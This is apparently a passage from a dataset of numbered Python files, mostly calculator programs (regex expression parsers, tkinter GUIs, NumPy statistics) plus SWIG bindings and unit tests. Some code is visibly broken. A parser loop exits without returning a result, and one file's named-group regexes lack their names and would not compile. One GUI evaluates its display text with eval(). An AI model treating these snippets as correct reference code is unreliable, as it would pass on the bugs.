calc_matrix.std(axis=1).tolist(), np.std(calc_matrix).tolist()],\n   # \"max\": [calc_matrix.max(axis=0).tolist(), calc_matrix.max(axis=1).tolist(), np.max(calc_matrix).tolist()],\n   # \"min\": [calc_matrix.min(axis=0).tolist(), calc_matrix.min(axis=1).tolist(), np.min(calc_matrix).tolist()],\n   # \"sum\": [calc_matrix.sum(axis=0).tolist(), calc_matrix.sum(axis=1).tolist(), np.sum(calc_matrix).tolist()]\n # }\n\n  calculations = {\n    \"mean\": [np.mean(calc_matrix, axis=0).tolist(), np.mean(calc_matrix, axis=1).tolist(), np.mean(calc_matrix).tolist()],\n    \"variance\": [np.var(calc_matrix, axis=0).tolist(), np.var(calc_matrix, axis=1).tolist(), np.var(calc_matrix).tolist()],\n    \"standard deviation\": [np.std(calc_matrix, axis=0).tolist(), np.std(calc_matrix, axis=1).tolist(), np.std(calc_matrix).tolist()],\n    \"max\": [np.max(calc_matrix, axis=0).tolist(), np.max(calc_matrix, axis=1).tolist(), np.max(calc_matrix).tolist()],\n    \"min\": [np.min(calc_matrix, axis=0).tolist(), np.min(calc_matrix, axis=1).tolist(), np.min(calc_matrix).tolist()],\n    \"sum\": [np.sum(calc_matrix, axis=0).tolist(), np.sum(calc_matrix, axis=1).tolist(), np.sum(calc_matrix).tolist()]\n  }\n\n  return calculations\n", "285": "#!/usr/bin/env python\n# -*- coding:utf-8 -*-\nimport re\ndef deal_minus_issue(calc_list):\n    new_calc_list= []\n    for index,item in enumerate(calc_list):\n        if item.strip().endswith(\"*\") or item.strip().endswith(\"/\"):\n            new_calc_list.append(\"%s-%s\" %(calc_list[index] , calc_list[index+1]))\n        elif (\"*\" or \"/\") in item:\n            new_calc_list.append(item)\n\n    print(\"new calc_list:\",new_calc_list)\n    return new_calc_list\ndef mutilpy_and_dividend(formula):\n    print(\"\u8fd0\u7b97\",formula)\n    calc_list = re.split(\"[+-]\",formula)\n    calc_list = deal_minus_issue(calc_list)\n    print(calc_list)\n    for item in calc_list:\n        sub_calc_list =re.split(\"[*/]\",item)\n        sub_operator_list = re.findall(\"[*/]\",item)\n        print(sub_calc_list,sub_operator_list)\n        sub_res = None\n        for index,i in enumerate(sub_calc_list):\n            if sub_res:#\u8fd9\u4e0d\u662f\u7b2c\u4e00\u6b21\u5faa\u73af\n                if sub_operator_list[index-1] == \"*\":\n                    sub_res *= float(i)\n                else:\n                    sub_res /= float(i)\n            else:\n                sub_res = float(i)\n        print(\"\\033[31;1m[%s]=\\033[0m\" %item, sub_res)\n        formula= formula.replace(item,str(sub_res))\n\n    print(\"\\033[32;1m\u7ed3\u679c\\033[0m\" ,formula)\n\ndef calc(formula):\n    parentheses_flag = True\n    while parentheses_flag:\n        m = re.search(\"\\([^()]+\\)\", formula)\n        if m:\n            print(m.group())\n            sub_formula = m.group().strip(\"()\")\n            sub_res = mutilpy_and_dividend(sub_formula)\n        break\nif __name__ == \"__main__\":\n    formula = \"1 - 2 * ( (60-30 + (9-2*5/-3 + 7 /3*99/4*2998 +10 * 568/14 )*(-40/5) ) - (-4*3)/ (16-3*2) )\"\n    res = calc(formula)", "286": "try:\r\n    import tkinter\r\nexcept ImportError:\r\n    import Tkinter as tkinter\r\n# mian window setup\r\ncalcWindow = tkinter.Tk()\r\n\r\ncalcWindow.title('Calculator')\r\ncalcWindow.geometry('320x500-20-300')\r\n\r\n# main window column configuration\r\ncalcWindow.columnconfigure(0, weight=15, minsize=15)\r\ncalcWindow.columnconfigure(1, weight=25, minsize=15)\r\ncalcWindow.columnconfigure(2, weight=25, minsize=15)\r\ncalcWindow.columnconfigure(3, weight=25, minsize=15)\r\ncalcWindow.columnconfigure(4, weight=25, minsize=15)\r\ncalcWindow.columnconfigure(5, weight=15, minsize=15)\r\n\r\n# main window row configuration\r\ncalcWindow.rowconfigure(0, weight=15, minsize=15)\r\ncalcWindow.rowconfigure(1, weight=15, minsize=15)\r\ncalcWindow.rowconfigure(2, weight=15, minsize=15)\r\ncalcWindow.rowconfigure(3, weight=15, minsize=15)\r\ncalcWindow.rowconfigure(4, weight=15, minsize=15)\r\ncalcWindow.rowconfigure(5, weight=15, minsize=15)\r\ncalcWindow.rowconfigure(6, weight=100, minsize=15)\r\n# Create Entery\r\nenterString = tkinter.Entry(calcWindow, relief='groove')\r\nenterString.grid(row=0, column=1, columnspan=4, sticky='news')\r\n\r\n# Func frame\r\n# funcButtonFrame = tkinter.Frame(calcWindow, width=3, height=3)\r\n# funcButtonFrame.grid(row=1, column=1,  sticky='news')\r\n\r\n# Function numbers\r\nbuttonCancel = tkinter.Button(calcWindow, text='C')\r\nbuttonCE = tkinter.Button(calcWindow, text='CE')\r\n\r\n# Func button positioning\r\nbuttonCancel.grid(row=1, column=1, sticky='news')\r\nbuttonCE.grid(row=1, column=2, sticky='news')\r\n\r\n# Create buttons Frame\r\n# buttonFrame = tkinter.Frame(calcWindow)\r\n# buttonFrame.grid(row=3, column=1, columnspan=3, sticky='news')\r\n\r\n# Create number buttons\r\nbutton0 = tkinter.Button(calcWindow, text='0')\r\nbutton1 = tkinter.Button(calcWindow, text='1')\r\nbutton2 = tkinter.Button(calcWindow, text='2')\r\nbutton3 = tkinter.Button(calcWindow, text='3')\r\nbutton4 = tkinter.Button(calcWindow, text='4')\r\nbutton5 = tkinter.Button(calcWindow, text='5')\r\nbutton6 = tkinter.Button(calcWindow, text='6')\r\nbutton7 = tkinter.Button(calcWindow, text='7')\r\nbutton8 = tkinter.Button(calcWindow, text='8')\r\nbutton9 = tkinter.Button(calcWindow, text='9')\r\n\r\n# Create Character buttons\r\nbuttonPlus = tkinter.Button(calcWindow, text='+')\r\nbuttonMinus = tkinter.Button(calcWindow, text='-')\r\nbuttonMult = tkinter.Button(calcWindow, text='*')\r\nbuttonDiv = tkinter.Button(calcWindow, text='/')\r\nbuttonEq = tkinter.Button(calcWindow, text='=')\r\n\r\n# Button positioning\r\nbutton7.grid(row=2, column=1, sticky=tkinter.E + tkinter.W)\r\nbutton8.grid(row=2, column=2, sticky='news')\r\nbutton9.grid(row=2, column=3, sticky='news')\r\nbuttonPlus.grid(row=2, column=4, sticky='news')\r\n\r\nbutton4.grid(row=3, column=1, sticky='news')\r\nbutton5.grid(row=3, column=2, sticky='news')\r\nbutton6.grid(row=3, column=3, sticky='news')\r\nbuttonMinus.grid(row=3, column=4, sticky='news')\r\n\r\nbutton1.grid(row=4, column=1, sticky='news')\r\nbutton2.grid(row=4, column=2, sticky='news')\r\nbutton3.grid(row=4, column=3, sticky='news')\r\nbuttonMult.grid(row=4, column=4, sticky='news')\r\n\r\nbutton0.grid(row=4, column=1, sticky='news')\r\nbuttonEq.grid(row=4, column=2, columnspan=2, sticky='news')\r\nbuttonDiv.grid(row=4, column=4, sticky='news')\r\n\r\n\r\ncalcWindow.mainloop()\r\n", "287": "# This file was automatically generated by SWIG (http://www.swig.org).\n# Version 3.0.8\n#\n# Do not make changes to this file unless you know what you are doing--modify\n# the SWIG interface file instead.\n\n\n\n\n\nfrom sys import version_info\nif version_info >= (2, 6, 0):\n    def swig_import_helper():\n        from os.path import dirname\n        import imp\n        fp = None\n        try:\n            fp, pathname, description = imp.find_module('_param_StackDistCalc', [dirname(__file__)])\n        except ImportError:\n            import _param_StackDistCalc\n            return _param_StackDistCalc\n        if fp is not None:\n            try:\n                _mod = imp.load_module('_param_StackDistCalc', fp, pathname, description)\n            finally:\n                fp.close()\n            return _mod\n    _param_StackDistCalc = swig_import_helper()\n    del swig_import_helper\nelse:\n    import _param_StackDistCalc\ndel version_info\ntry:\n    _swig_property = property\nexcept NameError:\n    pass  # Python < 2.2 doesn't have 'property'.\n\n\ndef _swig_setattr_nondynamic(self, class_type, name, value, static=1):\n    if (name == \"thisown\"):\n        return self.this.own(value)\n    if (name == \"this\"):\n        if type(value).__name__ == 'SwigPyObject':\n            self.__dict__[name] = value\n            return\n    method = class_type.__swig_setmethods__.get(name, None)\n    if method:\n        return method(self, value)\n    if (not static):\n        object.__setattr__(self, name, value)\n    else:\n        raise AttributeError(\"You cannot add attributes to %s\" % self)\n\n\ndef _swig_setattr(self, class_type, name, value):\n    return _swig_setattr_nondynamic(self, class_type, name, value, 0)\n\n\ndef _swig_getattr_nondynamic(self, class_type, name, static=1):\n    if (name == \"thisown\"):\n        return self.this.own()\n    method = class_type.__swig_getmethods__.get(name, None)\n    if method:\n        return method(self)\n    if (not static):\n        return object.__getattr__(self, name)\n    else:\n        raise AttributeError(name)\n\ndef _swig_getattr(self, class_type, name):\n    return _swig_getattr_nondynamic(self, class_type, name, 0)\n\n\ndef _swig_repr(self):\n    try:\n        strthis = \"proxy of \" + self.this.__repr__()\n    except Exception:\n        strthis = \"\"\n    return \"<%s.%s; %s >\" % (self.__class__.__module__, self.__class__.__name__, strthis,)\n\ntry:\n    _object = object\n    _newclass = 1\nexcept AttributeError:\n    class _object:\n        pass\n    _newclass = 0\n\n\n\ndef _swig_setattr_nondynamic_method(set):\n    def set_attr(self, name, value):\n        if (name == \"thisown\"):\n            return self.this.own(value)\n        if hasattr(self, name) or (name == \"this\"):\n            set(self, name, value)\n        else:\n            raise AttributeError(\"You cannot add attributes to %s\" % self)\n    return set_attr\n\n\nimport m5.internal.param_SimObject\nimport m5.internal.drain\nimport m5.internal.serialize\nclass StackDistCalc(m5.internal.param_SimObject.SimObject):\n    thisown = _swig_property(lambda x: x.this.own(), lambda x, v: x.this.own(v), doc='The membership flag')\n\n    def __init__(self, *args, **kwargs):\n        raise AttributeError(\"No constructor defined - class is abstract\")\n    __repr__ = _swig_repr\nStackDistCalc_swigregister = _param_StackDistCalc.StackDistCalc_swigregister\nStackDistCalc_swigregister(StackDistCalc)\n\nclass StackDistCalcParams(m5.internal.param_SimObject.SimObjectParams):\n    thisown = _swig_property(lambda x: x.this.own(), lambda x, v: x.this.own(v), doc='The membership flag')\n    __repr__ = _swig_repr\n\n    def create(self):\n        return _param_StackDistCalc.StackDistCalcParams_create(self)\n    disable_linear_hists = _swig_property(_param_StackDistCalc.StackDistCalcParams_disable_linear_hists_get, _param_StackDistCalc.StackDistCalcParams_disable_linear_hists_set)\n    disable_log_hists = _swig_property(_param_StackDistCalc.StackDistCalcParams_disable_log_hists_get, _param_StackDistCalc.StackDistCalcParams_disable_log_hists_set)\n    linear_hist_bins = _swig_property(_param_StackDistCalc.StackDistCalcParams_linear_hist_bins_get, _param_StackDistCalc.StackDistCalcParams_linear_hist_bins_set)\n    log_hist_bins = _swig_property(_param_StackDistCalc.StackDistCalcParams_log_hist_bins_get, _param_StackDistCalc.StackDistCalcParams_log_hist_bins_set)\n    verify = _swig_property(_param_StackDistCalc.StackDistCalcParams_verify_get, _param_StackDistCalc.StackDistCalcParams_verify_set)\n\n    def __init__(self):\n        this = _param_StackDistCalc.new_StackDistCalcParams()\n        try:\n            self.this.append(this)\n        except Exception:\n            self.this = this\n    __swig_destroy__ = _param_StackDistCalc.delete_StackDistCalcParams\n    __del__ = lambda self: None\nStackDistCalcParams_swigregister = _param_StackDistCalc.StackDistCalcParams_swigregister\nStackDistCalcParams_swigregister(StackDistCalcParams)\n\n\n\n", "288": "# This file was automatically generated by SWIG (http://www.swig.org).\n# Version 3.0.8\n#\n# Do not make changes to this file unless you know what you are doing--modify\n# the SWIG interface file instead.\n\n\n\n\n\nfrom sys import version_info\nif version_info >= (2, 6, 0):\n    def swig_import_helper():\n        from os.path import dirname\n        import imp\n        fp = None\n        try:\n            fp, pathname, description = imp.find_module('_param_StackDistCalc', [dirname(__file__)])\n        except ImportError:\n            import _param_StackDistCalc\n            return _param_StackDistCalc\n        if fp is not None:\n            try:\n                _mod = imp.load_module('_param_StackDistCalc', fp, pathname, description)\n            finally:\n                fp.close()\n            return _mod\n    _param_StackDistCalc = swig_import_helper()\n    del swig_import_helper\nelse:\n    import _param_StackDistCalc\ndel version_info\ntry:\n    _swig_property = property\nexcept NameError:\n    pass  # Python < 2.2 doesn't have 'property'.\n\n\ndef _swig_setattr_nondynamic(self, class_type, name, value, static=1):\n    if (name == \"thisown\"):\n        return self.this.own(value)\n    if (name == \"this\"):\n        if type(value).__name__ == 'SwigPyObject':\n            self.__dict__[name] = value\n            return\n    method = class_type.__swig_setmethods__.get(name, None)\n    if method:\n        return method(self, value)\n    if (not static):\n        object.__setattr__(self, name, value)\n    else:\n        raise AttributeError(\"You cannot add attributes to %s\" % self)\n\n\ndef _swig_setattr(self, class_type, name, value):\n    return _swig_setattr_nondynamic(self, class_type, name, value, 0)\n\n\ndef _swig_getattr_nondynamic(self, class_type, name, static=1):\n    if (name == \"thisown\"):\n        return self.this.own()\n    method = class_type.__swig_getmethods__.get(name, None)\n    if method:\n        return method(self)\n    if (not static):\n        return object.__getattr__(self, name)\n    else:\n        raise AttributeError(name)\n\ndef _swig_getattr(self, class_type, name):\n    return _swig_getattr_nondynamic(self, class_type, name, 0)\n\n\ndef _swig_repr(self):\n    try:\n        strthis = \"proxy of \" + self.this.__repr__()\n    except Exception:\n        strthis = \"\"\n    return \"<%s.%s; %s >\" % (self.__class__.__module__, self.__class__.__name__, strthis,)\n\ntry:\n    _object = object\n    _newclass = 1\nexcept AttributeError:\n    class _object:\n        pass\n    _newclass = 0\n\n\n\ndef _swig_setattr_nondynamic_method(set):\n    def set_attr(self, name, value):\n        if (name == \"thisown\"):\n            return self.this.own(value)\n        if hasattr(self, name) or (name == \"this\"):\n            set(self, name, value)\n        else:\n            raise AttributeError(\"You cannot add attributes to %s\" % self)\n    return set_attr\n\n\nimport m5.internal.param_SimObject\nimport m5.internal.drain\nimport m5.internal.serialize\nclass StackDistCalc(m5.internal.param_SimObject.SimObject):\n    thisown = _swig_property(lambda x: x.this.own(), lambda x, v: x.this.own(v), doc='The membership flag')\n\n    def __init__(self, *args, **kwargs):\n        raise AttributeError(\"No constructor defined - class is abstract\")\n    __repr__ = _swig_repr\nStackDistCalc_swigregister = _param_StackDistCalc.StackDistCalc_swigregister\nStackDistCalc_swigregister(StackDistCalc)\n\nclass StackDistCalcParams(m5.internal.param_SimObject.SimObjectParams):\n    thisown = _swig_property(lambda x: x.this.own(), lambda x, v: x.this.own(v), doc='The membership flag')\n    __repr__ = _swig_repr\n\n    def create(self):\n        return _param_StackDistCalc.StackDistCalcParams_create(self)\n    disable_linear_hists = _swig_property(_param_StackDistCalc.StackDistCalcParams_disable_linear_hists_get, _param_StackDistCalc.StackDistCalcParams_disable_linear_hists_set)\n    disable_log_hists = _swig_property(_param_StackDistCalc.StackDistCalcParams_disable_log_hists_get, _param_StackDistCalc.StackDistCalcParams_disable_log_hists_set)\n    linear_hist_bins = _swig_property(_param_StackDistCalc.StackDistCalcParams_linear_hist_bins_get, _param_StackDistCalc.StackDistCalcParams_linear_hist_bins_set)\n    log_hist_bins = _swig_property(_param_StackDistCalc.StackDistCalcParams_log_hist_bins_get, _param_StackDistCalc.StackDistCalcParams_log_hist_bins_set)\n    verify = _swig_property(_param_StackDistCalc.StackDistCalcParams_verify_get, _param_StackDistCalc.StackDistCalcParams_verify_set)\n\n    def __init__(self):\n        this = _param_StackDistCalc.new_StackDistCalcParams()\n        try:\n            self.this.append(this)\n        except Exception:\n            self.this = this\n    __swig_destroy__ = _param_StackDistCalc.delete_StackDistCalcParams\n    __del__ = lambda self: None\nStackDistCalcParams_swigregister = _param_StackDistCalc.StackDistCalcParams_swigregister\nStackDistCalcParams_swigregister(StackDistCalcParams)\n\n\n\n", "289": "def test_vasp_setup(require_vasp):\n    \"\"\"\n    Run some tests to ensure that VASP calculator constructs correct POTCAR files\n\n    \"\"\"\n\n    from os import remove\n    from os.path import isfile\n    from ase.atoms import Atoms\n    from ase.calculators.vasp import Vasp\n    from ase.test.calculator.vasp import installed\n\n    assert installed()\n\n\n    def check_potcar(setups, filename='POTCAR'):\n        \"\"\"Return true if labels in setups are found in POTCAR\"\"\"\n\n        pp = []\n        with open(filename, 'r') as f:\n            for line in f:\n                if 'TITEL' in line.split():\n                    pp.append(line.split()[3])\n        for setup in setups:\n            assert setup in pp\n\n    # Write some POTCARs and check they are ok\n    potcar = 'POTCAR'\n    try:\n        atoms = Atoms('CaGdCs',\n                      positions=[[0, 0, 1], [0, 0, 2], [0, 0, 3]], cell=[5, 5, 5])\n\n        calc = Vasp(xc='pbe')\n        calc.initialize(atoms)\n        calc.write_potcar()\n        check_potcar(('Ca_pv', 'Gd', 'Cs_sv'), filename=potcar)\n\n        calc = Vasp(xc='pbe', setups='recommended')\n        calc.initialize(atoms)\n        calc.write_potcar()\n        check_potcar(('Ca_sv', 'Gd_3', 'Cs_sv'), filename=potcar)\n\n        calc = Vasp(xc='pbe', setups='materialsproject')\n        calc.initialize(atoms)\n        calc.write_potcar()\n        check_potcar(('Ca_sv', 'Gd', 'Cs_sv'), filename=potcar)\n\n        atoms = Atoms('CaInI',\n                      positions=[[0, 0, 1], [0, 0, 2], [0, 0, 3]], cell=[5, 5, 5])\n        calc = Vasp(xc='pbe', setups={'base': 'gw'})\n        calc.initialize(atoms)\n        calc.write_potcar()\n        check_potcar(('Ca_sv_GW', 'In_d_GW', 'I_GW'), filename=potcar)\n\n        calc = Vasp(xc='pbe', setups={'base': 'gw', 'I': ''})\n        calc.initialize(atoms)\n        calc.write_potcar()\n        check_potcar(('Ca_sv_GW', 'In_d_GW', 'I'), filename=potcar)\n\n        calc = Vasp(xc='pbe', setups={'base': 'gw', 'Ca': '_sv', 2: 'I'})\n        calc.initialize(atoms)\n        calc.write_potcar()\n        check_potcar(('Ca_sv', 'In_d_GW', 'I'), filename=potcar)\n    finally:\n        if isfile(potcar):\n            remove(potcar)\n", "290": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "291": "import tkinter as tk\r\n\r\nwindow = tk.Tk()\r\n\r\nlbl_calc_result = tk.Label(\r\n    master= window,\r\n    text= '0',\r\n    width= 30,\r\n    height=3,\r\n)\r\nlbl_calc_result.grid(row=0, column=0 , columnspan=4)\r\n\r\ndef insert_number_in_calc_result(button_number):\r\n    current = lbl_calc_result['text']\r\n    if button_number == 'C':\r\n        lbl_calc_result['text'] = '0'\r\n    elif current == '0': \r\n        lbl_calc_result['text'] = button_number\r\n    elif button_number == '=':\r\n        lbl_calc_result['text'] = f'{eval(current)}'\r\n    else:\r\n        if button_number in ['+', '-' , '*']:\r\n            if current[-1] in ['+', '-' , '*']:\r\n                lbl_calc_result['text'] = current[:-1] + button_number\r\n            else:\r\n                lbl_calc_result['text'] += button_number\r\n        else:\r\n            lbl_calc_result['text'] += button_number\r\n\r\n\r\ncalc_list = [\r\n    {\r\n        'text' : '7',\r\n        'command' : lambda:insert_number_in_calc_result('7'),\r\n    },\r\n    {\r\n        'text' : '8',\r\n        'command' : lambda:insert_number_in_calc_result('8'),\r\n    },\r\n    {\r\n        'text' : '9',\r\n        'command' : lambda:insert_number_in_calc_result('9'),\r\n    },\r\n    {\r\n        'text' : '+',\r\n        'command' : lambda:insert_number_in_calc_result('+'),\r\n    },\r\n        {\r\n        'text' : '4',\r\n        'command' : lambda:insert_number_in_calc_result('4'),\r\n    },\r\n    {\r\n        'text' : '5',\r\n        'command' : lambda:insert_number_in_calc_result('5'),\r\n    },\r\n    {\r\n        'text' : '6',\r\n        'command' : lambda:insert_number_in_calc_result('6'),\r\n    },\r\n    {\r\n        'text' : '-',\r\n        'command' : lambda:insert_number_in_calc_result('-'),\r\n    },\r\n            {\r\n        'text' : '1',\r\n        'command' : lambda:insert_number_in_calc_result('1'),\r\n    },\r\n    {\r\n        'text' : '2',\r\n        'command' : lambda:insert_number_in_calc_result('2'),\r\n    },\r\n    {\r\n        'text' : '3',\r\n        'command' : lambda:insert_number_in_calc_result('3'),\r\n    },\r\n    {\r\n        'text' : '*',\r\n        'command' : lambda:insert_number_in_calc_result('*'),\r\n    },\r\n                {\r\n        'text' : '.',\r\n        'command' : lambda:insert_number_in_calc_result('.'),\r\n    },\r\n    {\r\n        'text' : '0',\r\n        'command' : lambda:insert_number_in_calc_result('0'),\r\n    },\r\n    {\r\n        'text' : 'C',\r\n        'command' : lambda:insert_number_in_calc_result('C'),\r\n    },\r\n    {\r\n        'text' : '=',\r\n        'command' : lambda:insert_number_in_calc_result('='),\r\n    },\r\n    \r\n]\r\n\r\ncalc_key_objs = []\r\n\r\nfor calc_key_data in calc_list:\r\n    btn = tk.Button(\r\n        master= window,\r\n        text=calc_key_data['text'],\r\n        command=calc_key_data['command'],\r\n        height=3,\r\n    )\r\n    calc_key_objs.append(btn)\r\n\r\nfor i, calc_key_obj in enumerate(calc_key_objs):\r\n    calc_key_obj.grid(row=(i//4)+1, column=i%4, sticky='nsew')\r\n\r\n\r\n# btn7 = tk.Button(\r\n#     master= window,\r\n#     text='7',\r\n#     command= lambda: print('7'),\r\n#     height=3,\r\n# )\r\n# btn7.grid(row=1 , column=0, sticky='ewsn')\r\n\r\n\r\nwindow.mainloop()", "292": "import unittest\n\nimport Main\nfrom Calculator import Calculator\n\n\nclass TestVariables(unittest.TestCase):\n    def TestAssign(self):\n        c = Calculator()\n\n        Main.calc_exp(\"i=1\", c)\n        self.assertTrue(c.v_manager.is_variable(\"i\"))\n        self.assertEqual(c.v_manager.get_var_val(\"i\"), 1)\n\n        Main.calc_exp(\"i=i+1\", c)\n        self.assertTrue(c.v_manager.is_variable(\"i\"))\n        self.assertEqual(c.v_manager.get_var_val(\"i\"), 2)\n\n    def test_inc(self):\n        c = Calculator()\n\n        Main.calc_exp(\"j=1\", c)\n        Main.calc_exp(\"j++\", c)\n\n        self.assertTrue(c.v_manager.is_variable(\"j\"))\n        self.assertEqual(c.v_manager.get_var_val(\"j\"), 2)\n\n        Main.calc_exp(\"++j\", c)\n\n        self.assertEqual(c.v_manager.get_var_val(\"j\"), 3)\n\n    def test_sub(self):\n        c = Calculator()\n\n        Main.calc_exp(\"j=1\", c)\n        Main.calc_exp(\"j--\", c)\n\n        self.assertTrue(c.v_manager.is_variable(\"j\"))\n        self.assertEqual(c.v_manager.get_var_val(\"j\"), 0)\n\n        Main.calc_exp(\"--j\", c)\n\n        self.assertEqual(c.v_manager.get_var_val(\"j\"), -1)\n\n    def test_multiple_vars(self):\n        c = Calculator()\n\n        Main.calc_exp(\"j=1\", c)\n        Main.calc_exp(\"i=j\", c)\n        Main.calc_exp(\"i++\", c)\n        Main.calc_exp(\"t=3\", c)\n        Main.calc_exp(\"c=5\", c)\n        Main.calc_exp(\"j++\", c)\n        Main.calc_exp(\"k=j^(c+t)-i\", c)\n\n        self.assertTrue(c.v_manager.is_variable(\"k\"))\n        self.assertEqual(c.v_manager.get_var_val(\"k\"), 254)\n", "293": "# \u8ba1\u7b97\u5668  3+ ((1* 5*3) + ( (3* (8/2)/2) +2 ) *2) *2 + 4\n\n# \u601d\u8def:\n# 1. \u5148\u53bb\u9664\u7a7a\u683c\n# 2. \u5bf9\u7279\u6b8a\u5b57\u7b26\u62a5\u9519(\u5b57\u6bcd\u3001\u52a0\u51cf\u4e58\u9664\u4e4b\u5916\u7684\u5b57\u7b26)\n# 3. \u62ec\u53f7\u90fd\u662f\u6210\u5bf9\u7684, \u8981\u4ece\u6700\u5185\u90e8\u7684\u62ec\u53f7\u5f00\u59cb\u8ba1\u7b97, \u7531\u5185\u800c\u5916, \u8ba1\u7b97\u540e\u5f97\u51fa\u7ed3\u679c\n# 4. \u5c063\u6b65\u9aa4\u5f97\u5230\u7684\u7ed3\u679c\u53bb\u66ff\u63623\u6b65\u9aa4\u5339\u914d\u5230\u7684\u62ec\u53f7\u53ca\u5185\u90e8\u7684\u5185\u5bb9, \u7136\u540e\u5f97\u5230\u4e00\u4e2a\u65b0\u7684\u5b57\u7b26\u4e32\n# 5. \u91cd\u590d\u6267\u884c3\u6b65\u9aa4\u548c4\u6b65\u9aa4, \u6700\u7ec8\u5f97\u5230\u4e00\u4e2a\u4e0d\u5305\u542b\u4efb\u4f55\u62ec\u53f7\u7684\u5b57\u7b26\u4e32, \u8ba1\u7b97\u8fd9\u4e2a\u5b57\u7b26\u4e32\u8868\u8fbe\u5f0f\u5c31\u662f\u6700\u7ec8\u7684\u7ed3\u679c\n\nimport re\n\n\ndef del_space(calc_str):\n    \"\"\"\n    \u53bb\u9664\u6574\u4e2a\u5b57\u7b26\u4e32\u4e2d\u7684\u7a7a\u683c\n    :param calc_str: \u539f\u59cb\u5b57\u7b26\u4e32\n    :return: \u53bb\u9664\u7a7a\u683c\u540e\u7684\u5b57\u7b26\u4e32\n    \"\"\"\n    data = calc_str.replace(\" \", \"\")\n    return data\n\n\ndef check_special(calc_str):\n    \"\"\"\n    \u68c0\u6d4b\u5b57\u7b26\u4e32\u4e2d\u662f\u5426\u6709\u5b57\u6bcd\u53ca\u975e\u8fd0\u7b97\u7684\u7279\u6b8a\u5b57\u7b26,\n    :param calc_str: \u539f\u59cb\u5b57\u7b26\u4e32\n    :return: True or False, \u82e5\u4e3aTrue\uff0c\u5219\u8868\u793a\u5b58\u5728\u7279\u6b8a\u5b57\u7b26\n    \"\"\"\n    pattern = re.compile(r\"[^\\d\\+\\-\\*\\/()]\")\n    check = pattern.findall(calc_str)\n    return check\n\n\ndef calculate(calc_str):\n    \"\"\"\n    \u5bf9\u5b57\u7b26\u4e32\u4e2d\u7684\u8868\u8fbe\u5f0f\u8fdb\u884c\u8ba1\u7b97\n    :param calc_str: \u6570\u5b66\u8ba1\u7b97\u8868\u8fbe\u5f0f\u7c7b\u578b\u7684\u5b57\u7b26\u4e32\n    :return: \u8ba1\u7b97\u540e\u7684\u7ed3\u679c\n    \"\"\"\n    while True:\n        if calc_str.find(\"*\") != -1:\n            pattern = re.compile(r\"(?P[\\d]+[.]?[\\d]*)(?P[*])(?P[\\d]+[.]?[\\d]*)\")\n            prv, typ, aft = pattern.search(calc_str).group(\"prv\", \"typ\", \"after\")\n            # re.sub(\"%s%s%s\" % (prv, typ, aft), str(value), calc_str)\n            calc_str = calc_str.replace(\"%s%s%s\" % (prv, typ, aft), str(float(prv) * float(aft)))\n            continue\n        elif calc_str.find(\"/\") != -1:\n            pattern = re.compile(r\"(?P[\\d]+[.]?[\\d]*)(?P[/])(?P[\\d]+[.]?[\\d]*)\")\n            prv, typ, aft = pattern.search(calc_str).group(\"prv\", \"typ\", \"after\")\n            calc_str = calc_str.replace(\"%s%s%s\" % (prv, typ, aft), str(float(prv) / float(aft)))\n            continue\n        elif calc_str.find(\"+\") != -1:\n            pattern = re.compile(r\"(?P[\\d]+[.]?[\\d]*)(?P[+])(?P[\\d]+[.]?[\\d]*)\")\n            prv, typ, aft = pattern.search(calc_str).group(\"prv\", \"typ\", \"after\")\n            calc_str = calc_str.replace(\"%s%s%s\" % (prv, typ, aft), str(float(prv) + float(aft)))\n            continue\n        elif calc_str.find(\"-\") != -1:\n            pattern = re.compile(r\"(?P[\\d]+[.]?[\\d]*)(?P[-])(?P[\\d]+[.]?[\\d]*)\")\n            prv, typ, aft = pattern.search(calc_str).group(\"prv\", \"typ\", \"after\")\n            calc_str = calc_str.replace(\"%s%s%s\" % (prv, typ, aft), str(float(prv) - float(aft)))\n            continue\n        else:\n            break\n    return calc_str\n\n\ndef replace_expr(calc_str):\n    \"\"\"\n    \u627e\u5230\u6700\u5185\u90e8\u7684\u62ec\u53f7, \u8ba1\u7b97\u51fa\u503c\u540e\u5c06\u503c\u66ff\u6362\u5230\u5b57\u7b26\u4e32\u4e2d\n    :param calc_str: \u7eaf\u7cb9\u7684\u8981\u8ba1\u7b97\u51fa\u7ed3\u679c\u7684\u5b57\u7b26\u4e32\n    :return: 